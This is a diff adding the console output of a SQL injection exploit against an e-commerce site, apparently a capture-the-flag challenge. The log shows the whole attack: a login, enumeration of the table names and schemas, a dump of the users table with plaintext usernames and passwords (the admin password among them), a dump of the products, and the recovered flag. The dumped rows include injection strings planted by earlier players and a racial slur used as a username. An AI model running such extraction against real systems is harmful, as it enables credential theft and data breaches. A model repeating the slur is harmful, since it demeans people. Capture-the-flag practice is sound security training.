@@ -1,0 +1,107 @@
+﻿c==================================================
+E-Commerce Platform SQL Injection Exploit
+==================================================
+
+[!] Using credentials: agexha@gmail.com:agexha@gmail.com
+[!] Register an account at the target if you don't have one
+
+[*] Logging in as agexha@gmail.com...
+[+] Login successful!
+
+==================================================
+RECONNAISSANCE
+==================================================
+[*] Extracting table names...
+[+] Tables: products,users,sqlite_sequence
+[*] Getting schema for table: users
+[+] Schema: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username text, password text, name text)
+[*] Getting schema for table: products
+[+] Schema: CREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+
+==================================================
+DATA EXTRACTION
+==================================================
+[*] Dumping users table...
+[+] Users found:
+    ID: 1, Username: admin, Password: mPFspNy72CRhn4a, Name: Administrator
+    ID: 2, Username: kastro, Password: kastro, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 3, Username: SIBORA, Password: 1234, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 4, Username: 0x04, Password: useruser, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 7, Username: inva, Password: inva, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 8, Username: asd, Password: asd, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 9, Username: leon, Password: leon, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 11, Username: test, Password: test, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 12, Username: tester123, Password: pass123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 13, Username: root, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 14, Username: administrator, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 15, Username: superuser, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 16, Username: user1, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 18, Username: robert, Password: robert, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 20, Username: aa, Password: aa, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 21, Username: evil&#39;, Password: pass, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 22, Username: sqli1769782802734, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 23, Username: sqli1769782805021, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 24, Username: sqli1769782806240, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 25, Username: sqli1769782807513, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 26, Username: sqli1769782808765, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 27, Username: test1769782836801, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 28, Username: robb, Password: robb, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 29, Username: test1769782861486, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 30, Username: sqli1769782887679, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 31, Username: sqli1769782915548, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 32, Username: qwer, Password: 1, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 33, Username: sqli1769782951608, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 35, Username: zxcv, Password: zxcv, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 36, Username: sqli1769782975632, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 38, Username: asdf, Password: asdf, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 39, Username: sqli1769783009049, Password: Test123!, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 40, Username: lmlm, Password: lmlm, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 41, Username: buba, Password: buba123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 42, Username: elionshala, Password: el, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 43, Username: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="98eaf7faf1d8eaf7faf1b6fbf7f5">[email&#160;protected]</a>, Password: robi, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 44, Username: lorik, Password: lorik123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 45, Username: testuser, Password: testpass123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 46, Username: nigger, Password: nigger, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 47, Username: trigilisa, Password: 5472shahinilisa, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 49, Username: liLkxDFy, Password: c, Name: /Windows/system.ini
+    ID: 50, Username: testtest, Password: 12345678, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 51, Username: admin&#39; --, Password: anything, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 52, Username: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d8b9bfbda0b0b998bfb5b9b1b4f6bbb7b5">[email&#160;protected]</a>, Password: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="127375776a7a7352757f737b7e3c717d7f">[email&#160;protected]</a>, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 53, Username: qwerty, Password: 1, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 54, Username: llordi, Password: llordi, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 55, Username: wec3wrc3wrd, Password: 1, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 56, Username: wiener, Password: wiener, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 57, Username: abc, Password: hello, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 58, Username: zzzz, Password: zzzz, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 59, Username: rikiriri, Password: admin123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 60, Username: user1769787412, Password: pass1234, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 61, Username: r.paco, Password: 123456789, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 62, Username: r.paco1, Password: 12345678, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 63, Username: testtest123, Password: testtest123, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 64, Username: user12345, Password: pass12345, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+    ID: 65, Username: une, Password: une, Name: testCREATE TABLE &#34;products&#34; (id INTEGER PRIMARY KEY, title text, description text, price text)
+[*] Dumping products table...
+[+] Products found:
+    ID: 1, Title: Foldsack No. 1 Backpack, Fits 15 Laptops, Price: $85
+    ID: 2, Title:  Women&#39;s Legends Naga Gold &amp; Silver Dragon Station Chain Bracelet, Price: $150
+    ID: 3, Title: Silicon Power 256GB SSD 3D NAND A55 SLC Cache Performance Boost SATA III 2.5, Price: $109
+    ID: 4, Title: Rain Jacket Women Windbreaker Striped Climbing Raincoats, Price: $39.99
+    ID: 5, Title: DANVOUY Womens T Shirt Casual Cotton Short, Price: $12.99
+    ID: 6, Title: Solid Gold Petite Micropave , Price: $168
+    ID: 7, Title: White Gold Plated Princess, Price: $9.99
+    ID: 8, Title: Mens Casual Slim Fit, Price: $15.99
+    ID: 9, Title: Children&#39;s Black Pirate Skull T-Shirt, Price: $35
+
+==================================================
+FLAG EXTRACTION
+==================================================
+
+[*] === GETTING FLAG ===
+[*] Looking for admin credentials...
+[+] Admin credentials: admin:mPFspNy72CRhn4a
+[+] Admin: admin:mPFspNy72CRhn4a
+
+[+] ========== FLAG FOUND ==========
+[+] CSC26{3_c0mm3rc3_pl4tf0rm}
+[+] ================================
+
